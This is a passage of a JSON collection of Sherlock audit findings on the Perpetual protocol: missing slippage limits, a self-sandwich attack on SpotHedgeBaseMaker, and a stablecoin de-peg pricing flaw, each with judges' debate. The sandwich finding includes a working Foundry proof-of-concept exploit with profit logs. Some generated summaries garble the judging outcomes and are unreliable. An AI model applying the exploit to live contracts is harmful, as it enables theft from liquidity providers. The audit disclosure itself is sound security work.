      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/121 \n\n## Found by \n0xRobocop, Bauer, IllIllI, PUSH0, ni8mare\n## Summary\n\nThere are no slippage control arguments for maker LP `deposit()`/`withdraw()`\n\n\n## Vulnerability Detail\n\nThere are no arguments to the `deposit()`/`withdraw()` functions to limit the amount of collateral lost to market movements, and there are no preview functions to allow a UI to show how much collateral would be received when shares are redeemed.\n\n\n## Impact\n\nA user may submit a transaction to redeem approximately $100 worth of shares given base price X, but when the block gets mined two seconds later, the price is at 0.5X due to a flash crash. By the time the user sees what they got, the crash has been arbitraged away, and the base price is back at price X, with the user having gotten half the amount they should have.\n\n\n## Code Snippet\n\nUsers can only specify inputs, not expected outputs:\n```solidity\n// File: src/maker/OracleMaker.sol : OracleMaker.deposit()   #1\n\n175:        function deposit(uint256 amountXCD) external onlyWhitelistLp returns (uint256) {\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L165-L185\n\n```solidity\n// File: src/maker/OracleMaker.sol : OracleMaker.withdraw()   #2\n\n228:        function withdraw(uint256 shares) external onlyWhitelistLp returns (uint256) {\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L218-L238\n\nand the value received is based on the Pyth [oracle](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L439-L443).\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nProvide slippage parameters\n\n\n\n## Discussion\n\n**sherlock-admin3**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Medium\n\n**takarez** commented:\n>  no need of slippage.\n\n\n\n**lnxrp**\n\n- Invalid, known issue\n- We will add protection in the future to both makers ([link](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/maker/OracleMaker.sol#L196-L198))([link](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L270-L272)) against volatility, but it is consider non-urgent since deposit/withdraw is whitelisted at the beginning\n\n**lnxrp**\n\nClarification: we knew there is currently not enough protection as commented in the two links above\n\n**IllIllI000**\n\nEscalate\n\nAs is pointed out [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/140#issuecomment-2037788941), the hierarchy says this should be valid, and if that escalation is right about the rule, this one should be valid because it's a loss of funds to the LP without any way to avoid it. See also [this](https://discord.com/channels/812037309376495636/1211689150663622707/1225550119651377304)\n\n**sherlock-admin2**\n\n> Escalate\n> \n> As is pointed out [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/140#issuecomment-2037788941), the hierarchy says this should be valid, and if that escalation is right about the rule, this one should be valid because it's a loss of funds to the LP without any way to avoid it. See also [this](https://discord.com/channels/812037309376495636/1211689150663622707/1225550119651377304)\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**nevillehuang**\n\nI believe this issue should remain invalid given it is a known issue based on code comments within contract, unless I have misinterpreted what the hierachy of truth is meant to represent.\n\n**WangSecurity**\n\nI believe this should remain invalid. The hierarchy of truth is used when there's a conflicting information between the README, rules or comments, which is not the case when we talk about intended design/known issues. Hence, planning to reject the escalation and leave the issue as it is.\n\n**Evert0x**\n\nResult:\nInvalid\nHas Duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [IllIllI000](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/121/#issuecomment-2039394011): rejected\n\n**Evert0x**\n\n#121 and duplicates will become Medium. The hierachy of truth will be interpreted as stated here https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/65#issuecomment-2077966086.",
      "summary": "\nThe report highlights a bug found in a Maker LP deposit and withdraw function. The vulnerability allows for potential loss of collateral due to market movements, with no way to limit the amount of loss or preview the amount of collateral received. This could result in a user receiving only half of the expected amount due to a flash crash. The code snippet provided shows that the value received is based on the Pyth oracle. The recommendation is to provide slippage parameters to prevent this issue. The discussion among the judges concludes that this is a known issue and is not urgent to fix. The bug is considered invalid and has been marked as Medium priority. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/121",
      "tags": [],
      "finders": [
        "IllIllI",
        "ni8mare",
        "Bauer",
        "0xRobocop",
        "PUSH0"
      ]
    },
    {
      "id": "32171",
      "title": "M-8: Attackers can sandwich their own trades up to the price bands",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/119 \n\n## Found by \nIllIllI, santipu\\_\n## Summary\n\nMalicious users can sandwich their own SpotHedgeBaseMaker trades up to the price band cap\n\n\n## Vulnerability Detail\n\nThe SpotHedgeBaseMaker allows one to settle trades against a UniswapV3 pool. The assumption is that the pool prices tokens properly, and any imbalance in the pool is reflected in the price paid/amount received by the trader interacting with the SpotHedgeBaseMaker. This assumption is incorrect, because an attacker can sandwich their own trade, taking value out of the Perpetual system.\n\nThe attacker would get a large flash loan, imbalance the pool, use the ClearingHouse to settle and opening trade, then re-balance the pool, all in the same transaction. \n\n\n## Impact\n\nFor example, assume the actual exchange rate is $4,000/1WEth, and the attacker is able to skew it such that the exchange rate temporarily becomes $1/1WEth. The attacker opening a short of 1Eth means that the SpotHedgeBaseMaker ends up going long 1Eth, and hedges that long by swapping 1WEth for $1. The attacker ends up using ~1 in margin to open the short. After the attacker unwinds the skew, they've gained ~1WEth (~$4k) from the rebalance, and they can abandon the perp account worth -$4k.\n\nIn reality, the attacker won't be able to skew the exchange rate by quite that much, because there's a price band [check](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L331) at the end of the trade, ensuring that the price gotten on the trade is roughly equivalent to the oracle's price. The test [comments](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/test/orderGatewayV2/OrderGatewayV2.settleOrder.int.t.sol#L1271) indicate that the bands are anticipated to be +/- 10%. If the price bands are set to zero (the swap price must be the oracle price), then the SpotHedgeBaseMaker won't be usable at all, since uniswap charges a fee for every trade. If the bands are widened to be just wide enough to accommodate the fee, then other parts of the system, such as the OracleMaker won't work properly (see other submitted issue). Therefore, either _some_ value will be extractable, or parts of the protocol will be broken.\n\nBecause of these restrictions/limitations I've submitted this as a Medium.\n\n\n## Code Snippet\n\nThe SpotHedgeBaseMaker doesn't require that the [sender](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L281) be the [Gateway/GatewayV2](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L231-L232), so anyone can execute it directly from the ClearingHouse:\n```solidity\n// File: src/maker/SpotHedgeBaseMaker.sol : SpotHedgeBaseMaker.isValidSender()   #1\n\n514        function isValidSender(address) external pure override returns (bool) {\n515            return true;\n516:       }\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L504-L526\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nRequire that SpotHedgeBaseMaker be executed by a relayer\n\n\n\n## Discussion\n\n**42bchen**\n\n```\n// ETH oracle 100, spot 100 (100 ETH, 10000 USDC) assume no fee, full range v3 liquidity\n// user flashLoan buy ETH -> spot 400 (50 ETH, 20000 USDC), user borrow 10000 USDC to swap, get 50 ETH\n// user open short position on SHBM\n// - SHBM sell 1 ETH -> (51 ETH,19607.84 USDC) -> get 392.16 USDC\n// - user openNotional 392.16 USDC, SHBM openNotional -392.16 USDC\n// user sell 50 ETH to pool (101 ETH, 9,900.99 USDC), get 9706.85 USDC\n// result:\n// - user profit: -10000 (borrow debt) + 292.16 (system profit) + 9706.85 (from selling ETH) = -1\n// - SHBM profit: 392.16 (sell ETH) + -292.16 (system profit) = 100\n// user didn't has profit\n```\n\nthe user profit in the system does not reflect the real profit in the whole attack operation; the attacker needs some cost to push the price.\nOur spotHedgeMaker is hedged, and our system total pnl = 0\n\n**IllIllI000**\n\n@42bchen can you take a look at this test case? I believe it shows that sandwiching can be profitable as long as there's enough of a price difference between the pyth price and the uniswap price (note that it's not trading against the OracleMaker - only against the SHBM). Change `spotPoolFee` to be `100` in SpotHedgeBaseMakerForkSetup.sol, then add this test as perp-contract-v3/test/spotHedgeMaker/Sandwich.sol\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\n// forge test --match-test testSandwich -vv\n\nimport \"forge-std/Test.sol\";\nimport \"../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol\";\nimport { OracleMaker } from \"../../src/maker/OracleMaker.sol\";\nimport \"../../src/common/LibFormatter.sol\";\nimport { SignedMath } from \"@openzeppelin/contracts/utils/math/SignedMath.sol\";\n\ncontract priceDivergence is SpotHedgeBaseMakerForkSetup {\n\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public exploiter = makeAddr(\"Exploiter\");\n    OracleMaker public oracle_maker;\n\n    function setUp() public override {\n        super.setUp();\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n        config.setFundingConfig(marketId, 0.005e18, 1.3e18, address(oracle_maker));\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether);\n        oracle_maker.setValidSender(exploiter,true);\n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(2000,0);\n    }\n\n    function testSandwich() public {\n       // deposit 2k collateral as margin for exploiter\n       _deposit(marketId, exploiter, 2_000e6);\n\n       // deposit 2000 base tokens ($4M) to the HSBM\n       vm.startPrank(makerLp);\n       deal(address(baseToken), makerLp, 2000e9, true);\n       baseToken.approve(address(maker), type(uint256).max);\n       maker.deposit(2000e9);\n       vm.stopPrank();\n\n       // exploiter has 43 base tokens ($86K)\n       deal(address(baseToken), exploiter, 43e9, true);\n\n       // exploiter balances at the start\n       uint256 baseBalanceStart = baseToken.balanceOf(exploiter);\n       console.log(\"exploiter initial values (margin, collateral, base)\");\n       console.logInt(vault.getMargin(marketId,address(exploiter)).formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals()));\n       console.log(collateralToken.balanceOf(exploiter));\n       console.log(baseBalanceStart);\n\n       // the price gapped ~7% within the last 60 seconds, and nobody has updated the pyth price,\n       // but the uniswap pool has already adjusted\n       int64 oldPrice = 2000 * 93 / 100;\n       _mockPythPrice(oldPrice,0);\n\n       // first stage: skew in favor of collateral token\n       vm.startPrank(exploiter);\n       baseToken.approve(address(uniswapV3Router), type(uint256).max);\n       uniswapV3Router.exactInput(\n           ISwapRouter.ExactInputParams({\n               path: uniswapV3B2QPath,\n               recipient: exploiter,\n               deadline: block.timestamp,\n               amountIn: baseToken.balanceOf(exploiter),\n               amountOutMinimum: 0\n           })\n        );\n\n        // second stage: open short position on SHBM\n        (int256 pbT, int256 pqT) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 2e18,\n                oppositeAmountBound: 1,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        // third stage: swap back to fix the skew\n        collateralToken.approve(address(uniswapV3Router), type(uint256).max);\n        uniswapV3Router.exactInput(\n                ISwapRouter.ExactInputParams({\n                    path: uniswapV3Q2BPath,\n                    recipient: exploiter,\n                    deadline: block.timestamp,\n                    amountIn: collateralToken.balanceOf(exploiter),\n                    amountOutMinimum: 0\n                })\n            );\n\n       console.log(\"exploiter ending values (margin, collateral, base)\");\n       uint256 baseBalanceFinish = baseToken.balanceOf(exploiter);\n       console.logInt(vault.getMargin(marketId,address(exploiter)).formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals()));\n       console.log(collateralToken.balanceOf(exploiter));\n       console.log(baseBalanceFinish);\n\n       // gain is for more than one ETH, which is enough to abandon the collateral in the vault\n       console.log(\"Gain:\", baseBalanceFinish - baseBalanceStart);\n\n       vm.stopPrank();\n    }\n}\n```\n\noutput:\n```text\nLogs:\n  exploiter initial values (margin, collateral, base)\n  2000000000\n  0\n  43000000000\n  exploiter ending values (margin, collateral, base)\n  2000000000\n  0\n  44018525544\n  Gain: 1018525544\n```\n\n**paco0x**\n\n@IllIllI000 thanks for your POC scripts. After carefully analyzing the numbers in this test case, I believe that the exploiter's profit is caused by bad debt under the assumption of deviation in pyth prices in 60s (7% in this case). \n\nIn this test, the exploiter's actual source of income is that he increased his buying power by using a stale price for opening position. He short 2 ETH with avg price 964, this position passed the IM ratio check since the price is 1860 instead of 2000 in contract. And he'll be in bad debt after the price updated to 2000 in the contract. The SHBM is always hedged and does not lose money.\n\nTo mitigate the price deviation issue, we're currently using a permissioned keeper to settle user's orders with makers, but seems users can still open position directly with SHBM to bypass the keeper. And if the price deviation issue exists, there'll be a room to intentionally generate bad debt and make profit, just like in this test case.\n\nSo I agree this issue is valid, but under the price deviation assumption. If you have any other idea that can bypass this assumption, I would agree to elevate the severity level of this issue.\n\nThe initial idea to solve this issue is: \n1. use a relayer to settle orders with SHBM\n2. impose some restrictions on the average price of open positions, in order to prevent avg price from deviating too much from the oracle.\n\nThanks a lot for you great work!\n\n**paco0x**\n\n> @IllIllI000 thanks for your POC scripts. After carefully analyzing the numbers in this test case, I believe that the exploiter's profit is caused by bad debt under the assumption of deviation in pyth prices in 60s (7% in this case).\n> \n> In this test, the exploiter's actual source of income is that he increased his buying power by using a stale price for opening position. He short 2 ETH with avg price 964, this position passed the IM ratio check since the price is 1860 instead of 2000 in contract. And he'll be in bad debt after the price updated to 2000 in the contract. The SHBM is always hedged and does not lose money.\n> \n> To mitigate the price deviation issue, we're currently using a permissioned keeper to settle user's orders with makers, but seems users can still open position directly with SHBM to bypass the keeper. And if the price deviation issue exists, there'll be a room to intentionally generate bad debt and make profit, just like in this test case.\n> \n> So I agree this issue is valid, but under the price deviation assumption. If you have any other idea that can bypass this assumption, I would agree to elevate the severity level of this issue.\n> \n> The initial idea to solve this issue is:\n> \n> 1. use a relayer to settle orders with SHBM\n> 2. impose some restrictions on the average price of open positions, in order to prevent avg price from deviating too much from the oracle.\n> \n> Thanks a lot for you great work!\n\nAnother thing to add on, in this test case, we didn't set the price band in `Config` contract. If we add a price band of 20% in the `setUp` like:\n\n```\n config.setPriceBandRatio(marketId, 0.2e18);\n```\n\nThe exploiter cannot open his position since the trade price deviates too much from oracle price. The difficulty of this attack will significantly increase with a effective price band.\n\n**IllIllI000**\n\nthanks @paco0x in [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/128) issue, I point out that the price bands can be bypassed via sandwich as well, by using different pyth prices. Please let me know your thoughts on that one as well, there, since it's currently marked as a duplicate of one that is marked as sponsor-disputed.\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/perpetual-protocol/perp-contract-v3/pull/19\n\n\n**nirohgo**\n\nEscalate\n\nShould be invalid:  \nA. The POC presented is highly unlikely for serveral reasons:\n1. For it to work, the pool in question needs to have low liquidity. the pool is initialized with $200,000(collateral)/100Eth(base) in SpotHedgeBaseMakerForkSetup line 81/82. If you add just one zero to each (representing a more likely liquidity of $2M) the attack doesn't hold because of reduced slippage. For reference, currently on UniV3 on optimism Eth/USDT has 2M and Eth/USDC has 10M.\n2. The fee tier was changed to 100 (0.01%) which again, in highly unlikely since this rate is used only for stable pairs. change to 3000 and the attack doesn't hold.\n3. The POC scenario of a price drop of 7% within 60 seconds with no onchain update of the Pyth contract is also highly unlikely as such price shifts are rare and likely to draw an immediate update as many protocols can be affected.\n\nB.  Even if all the above conditions hold, the profit calculation is wrong: The exploiter in the example deposited $2000 collateral and is left with an unrealized PnL of -$1790 at the end (add these lines at the end to see):\n```solidity\nint256 on = vault.getOpenNotional(marketId,exploiter).formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());\n int256 unrePnl = vault.getUnrealizedPnl(marketId, exploiter, uint256(uint64(oldPrice)) * (10**18));\nconsole.logInt(on);\nconsole.logInt(unrePnl);\n``` \nwhich means if they \"abandon the perp\" as the finding suggests they are out $2000 and have gained nothing. \nThe original finding scenario is even more unrealistic (even if we disregard the price band check) because the amount required to drop the price from $4000 to $1 for a univ3 pair with reasonable liquidity will make the exploit non-profitable due to the Uni trading fees.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> Should be invalid:  \n> A. The POC presented is highly unlikely for serveral reasons:\n> 1. For it to work, the pool in question needs to have low liquidity. the pool is initialized with $200,000(collateral)/100Eth(base) in SpotHedgeBaseMakerForkSetup line 81/82. If you add just one zero to each (representing a more likely liquidity of $2M) the attack doesn't hold because of reduced slippage. For reference, currently on UniV3 on optimism Eth/USDT has 2M and Eth/USDC has 10M.\n> 2. The fee tier was changed to 100 (0.01%) which again, in highly unlikely since this rate is used only for stable pairs. change to 3000 and the attack doesn't hold.\n> 3. The POC scenario of a price drop of 7% within 60 seconds with no onchain update of the Pyth contract is also highly unlikely as such price shifts are rare and likely to draw an immediate update as many protocols can be affected.\n> \n> B.  Even if all the above conditions hold, the profit calculation is wrong: The exploiter in the example deposited $2000 collateral and is left with an unrealized PnL of -$1790 at the end (add these lines at the end to see):\n> ```solidity\n> int256 on = vault.getOpenNotional(marketId,exploiter).formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());\n>  int256 unrePnl = vault.getUnrealizedPnl(marketId, exploiter, uint256(uint64(oldPrice)) * (10**18));\n> console.logInt(on);\n> console.logInt(unrePnl);\n> ``` \n> which means if they \"abandon the perp\" as the finding suggests they are out $2000 and have gained nothing. \n> The original finding scenario is even more unrealistic (even if we disregard the price band check) because the amount required to drop the price from $4000 to $1 for a univ3 pair with reasonable liquidity will make the exploit non-profitable due to the Uni trading fees.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IllIllI000**\n\nLogically, if a sandwich can be shown to be profitable with one specific set of numbers with no mistakes and feasible settings, then other combinations are also possible, and it's not my job to show every single possible combination - one suffices to show that there's a security risk here, where a sandwich can cause bad debt to occur. The sponsor confirmed the numbers themselves - they didn't just take my word for it. The escalating watson also misunderstood the POC, because the profit is the extra 0.018525544 Eth gained from swapping back after the sandwich, not anything in the perp account, which will be abandoned\n\n**nirohgo**\n\n> The escalating watson also misunderstood the POC, because the profit is the extra 0.018525544 Eth gained from swapping back after the sandwich, not anything in the perp account, which will be abandoned\n\nI understood the POC, it's just that the POC output states gains are 1.018525544Eth so I thought you forgot about the abandoned amount.\n\n\n> Logically, if a sandwich can be shown to be profitable with one specific set of numbers with no mistakes and feasible settings, then other combinations are also possible, and it's not my job to show every single possible combination - one suffices to show that there's a security risk here, where a sandwich can cause bad debt to occur.\n\nMy point is that these setting are not feasible. As mentioned, pool fee of 100 is only used with stable pairs. Since collateral is USDT this means a pair with some other USD pegged token. This means much lower uniswap slippage than in the POC (even with the given liquidity) and much smaller chance of there being a 7% price drop within 60 seconds that doesn't get published onchain. (Actually I don't think a futures market on a pair of two USD pegged stables is even a thing)\n\n**IllIllI000**\n\nWETH/USDC on OP has a 0.05% fee https://info.uniswap.org/pools#/optimism/pools/0x85149247691df622eaf1a8bd0cafd40bc45154a9\nChanging the unit test to use 44e9 base tokens instead of 43e9, and a 7.2% drop instead of 7.0% results in the test still passing with a profit with a 0.05% fee instead of the 0.01% one you say is not feasible\n\n**nevillehuang**\n\n@IllIllI000 I believe based on the impact of profit you have shown and the constrained scenario required to execute this attack, medium severity is more appropriate\n\n**nirohgo**\n\nHi @nevillehuang , I still think it's a low. The new scenario the watson proposed generates around $2 profit in the black swanish event of a 7.2% price drop within 60 seconds (that is not reported on chain). I Dont think it qualifies even as a medium.\n\n**IllIllI000**\n\nThe _risk-free_ profit is ~[$67](https://duckduckgo.com/?q=0.018525544+eth+to+usd&ia=cryptocurrency) with an investment of only 1 Eth, which is ~2%. The POC only used 1Eth, but much larger amounts can be used instead\n\n**nirohgo**\n\n> The _risk-free_ profit is ~[$67](https://duckduckgo.com/?q=0.018525544+eth+to+usd&ia=cryptocurrency) with an investment of only 1 Eth, which is ~2%. The POC only used 1Eth, but much larger amounts can be used instead\n\nNot really - $67 was the original POC scenario which we're establish is not feasible. Under the new one you provided: \"Changing the unit test to use 44e9 base tokens instead of 43e9, and a 7.2% drop instead of 7.0% results in the test still passing with a profit with a 0.05% fee instead of the 0.01% one you say is not feasible\" the \"gains\" are only 1.001184143 which leaves around $2 after the abandoned position. (again, that too is only possible under an extremely rare event)\n\n**IllIllI000**\n\nOk, yes, it's ~[$4](https://duckduckgo.com/?q=0.001184143+eth+to+usd&ia=cryptocurrency) with the specific POC and the updated fee, my mistake in copying the old value. However, like I said this is on a base of 1 eth, and this is a risk free attack that can be larger depending on how much capital is available to the attacker\n\n**nirohgo**\n\nYes, but that too, only when there's a 7.2% price drop within 60 seconds that wasn't reported to pyth onchain. I mean, how often does that happen?\n\n**IllIllI000**\n\nThe sponsor is fixing the issue, so it's not a risk they're willing to take. I think at this point we should let the judge decide\n\n**nevillehuang**\n\n@IllIllI000 I believe this is borderline medium/high. Do you have an example of a token (I suppose any non-weird token) that this has occured for a pyth oracle return value (maybe we could check their [dashboards](https://pyth.network/price-feeds))? If not I believe given the relatively uncommon occurence of this, medium severity seems appropriate\n\n**IllIllI000**\n\nI spent quite a bit of time trying to provide an example. Some issues I'm facing are that none of the Pyth web interfaces let you do range queries, so I have to manually fetch prices one-by-one in order to find an example. Etherscan also doesn't help because _all_ updates are done via a single contract, and it doesn't let me filter transaction-internal function calls by parameter, so it's another manual process. Even if I were to spend the hours digging through to find an example, the head of judging may have some other requirement that I need to search for, just like after countering nirohgo's complaints there's this new request, so I'd rather not spend more time searching for something that may or may not convince the head of judging, and just wait to hear what they ask for. The sponsor found the finding to be [valuable](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/119#issuecomment-2029396462), the POC shows a risk-free profit, and the add-on submission shows a way to counter the price band protections. I agree that the specific POC I provided depends on a gap occurring\n\n**WangSecurity**\n\n@IllIllI000 From the comments above it's not clear for me: the attack has specific external conditions and state to occur or the restrictions are low? Can you elaborate a bit on what are prerequisites and constaints for this issue to happen? Thank you in advance!\n\n**IllIllI000**\n\n@WangSecurity I've tried again today to find other combinations of margin, collateral, leverage, and sandwich size, but since it's a manual process of trial and error of all of these parameters, as well as a bit of fuzzing, and I wasn't able to get anywhere useful. Given that, you can consider the external condition to be that there is a large gap (7%) for the attacker to make a profit. Any smaller gap just creates a loss for the LP which is supposed to be hedged and not have losses, but the attacker loses more.\n\n**WangSecurity**\n\nTherefore, based on the comment above, I believe medium severity is appropriate here. Thank you for all the help and work on this issue. Since the escalation proposes it should be invalid, planning to reject the escalation, but downgrade it to medium.\n\nIf you have any other inputs/comments on this, would be glad to hear.\n\n**Evert0x**\n\nResult:\nMedium\nHas Duplicates\n\n**sherlock-admin3**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [nirohgo](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/119/#issuecomment-2041334421): rejected\n\n**sherlock-admin3**\n\nThe Lead Senior Watson signed off on the fix.",
      "summary": "\nThe report discusses a bug found in the SpotHedgeBaseMaker feature of a trading platform. The bug allows malicious users to manipulate the price of tokens and make a profit by taking advantage of a flaw in the system. This can lead to losses for the platform and its users. The bug was discovered by a user named IllIllI and confirmed by the platform's sponsor. The severity of the bug is debated, with some experts suggesting it is a medium-level issue while others believe it is low. The bug has since been fixed by the platform's team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/119",
      "tags": [],
      "finders": [
        "IllIllI",
        "santipu\\_"
      ]
    },
    {
      "id": "32170",
      "title": "M-7: SpotHedgeBaseMaker LPs will be able to extract value during a USDT/USDC de-peg",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/118 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nIllIllI, PUSH0\n## Summary\n\nThe Perpetual protocol only supports USDT as collateral, but prices everything as though USDT were always equal to 1-for-1. Ongoing [small de-pegs](https://coinmarketcap.com/currencies/tether/) will only leave small amounts for arbitrage, because any arbitrage in size will skew the OracleMaker and UniswapV3 pools' prices to account for the opportunity. One case that cannot be handled is a large de-peg when the SpotHedgeBaseMaker has a lot of base tokens available.\n\n\n## Vulnerability Detail\n\nThe protocol's contest [readme](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/README.md?plain=1#L15) says that either USDT or USDC will be used as collateral, and the project [documentation](https://perp.notion.site/PythOraclePool-e99a88be051f4bc8be0b1310eb982cd4) says that it will use Pyth oracles for pricing base tokens. Pyth only has a single oracle for USDT and USDC [each](https://pyth.network/developers/price-feed-ids), which is their USD value. All other Pyth oracles are for the USD price, not the USDT or USDC price.\n\nIn the case of the SpotHedgeBaseMaker, when a user wishes to withdraw their base tokens, it calculates the total value of all of the LP shares, as the [value](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L734-L743) of the vault account plus the net base tokens contributed during all deposit()s/withdraw()s. The price that it uses to convert the value of the vault in the vault's collateral, into the value of the vault in the base token's units, is the &lt;base>/USD price, not a &lt;base>/USDT or &lt;base>/USDC price (because there isn't an oracle for that).\n\n\n## Impact\n\nIf USDT is the collateral token and de-pegs by 30%, instead of valuing the account's collateral at 70% of what was deposited, it keeps it at 100%, letting each LP share withdraw more funds than it should be able to. Only base tokens can be withdrawn, so the first LPs to withdraw during the de-peg will get more than they should, leaving less for all others.\n\nA similar issue exists with all markets whose SpotHedgeBaseMaker's LP deposit/withdraw tokens are wrapped/bridged tokens, vs the actual token itself (e.g. WETH vs ETH). The price the SpotHedgeBaseMaker uses is the price returned by the oracle for the market, which is the actual token's oracle, not the hedging token's oracle. If there is a de-peg there (e.g. because the wrapped token is considered by some jurisdictions as a 'security', whereas the underlying isn't), then the amount of tokens deposited will be over-valued, and at the end when the market is wound down, profits not covered by the deposited hedging tokens will be withdrawable as the collateral token, which will have been over-valued at the expense of the other LPs.\n\n\n## Code Snippet\n\nThe function to calculate the vault value in units of the base token, takes in a price...:\n```solidity\n// File: src/maker/SpotHedgeBaseMaker.sol : SpotHedgeBaseMaker.withdraw()   #1\n\n311            uint256 redeemedRatio = shares.divWad(totalSupply()); // in ratio decimals 18\n...\n320            uint256 price = _getPrice();\n321 @>         uint256 vaultValueInBase = _getVaultValueInBaseSafe(vault, price);\n322            uint256 withdrawnBaseAmount = vaultValueInBase.mulWad(redeemedRatio).formatDecimals(\n323                INTERNAL_DECIMALS,\n324                _getSpotHedgeBaseMakerStorage().baseTokenDecimals\n325:           );\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L311-L325\n\n...which refers to the market's oracle's price:\n```solidity\n// File: src/maker/SpotHedgeBaseMaker.sol : SpotHedgeBaseMaker.price   #2\n\n769        function _getPrice() internal view returns (uint256) {\n770            IAddressManager addressManager = getAddressManager();\n771 @>         (uint256 price, ) = addressManager.getPythOracleAdapter().getPrice(\n772                addressManager.getConfig().getPriceFeedId(_getSpotHedgeBaseMakerStorage().marketId)\n773            );\n774            return price;\n775:       }\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L769-L775\n\nwhich is the price returned from the [pyth](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/oracle/pythOracleAdapter/PythOracleAdapter.sol#L80-L83) contract (converted for decimals), which is a USD price.\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nUse the &lt;quote-token>/USD oracle to convert the &lt;base-token>/USD price to a &lt;base-token>/&lt;quote-token> oracle\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Medium\n\n**takarez** commented:\n>  the ReadMe says \"Oracle (Pyth) is expected to accurately report the price of market\" which kinda mean that the pyth is trusted and realiable",
      "summary": "\nThis bug report discusses a vulnerability found in the Perpetual protocol, specifically in the SpotHedgeBaseMaker function. The protocol only supports USDT as collateral but prices everything as though USDT were always equal to 1-for-1. This means that during small de-pegs, there is not enough opportunity for arbitrage, and during large de-pegs, there is a risk of overvaluing the collateral and allowing some LPs to withdraw more than they should. The vulnerability is caused by the protocol using the USD price instead of the USDT or USDC price when converting the value of the vault into the base token's units. The report recommends using the <quote-token>/USD oracle to convert the <base-token>/USD price to a <base-token>/<quote-token> oracle. The vulnerability was found through a manual review and it is suggested that the protocol should use a more reliable and trusted oracle. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
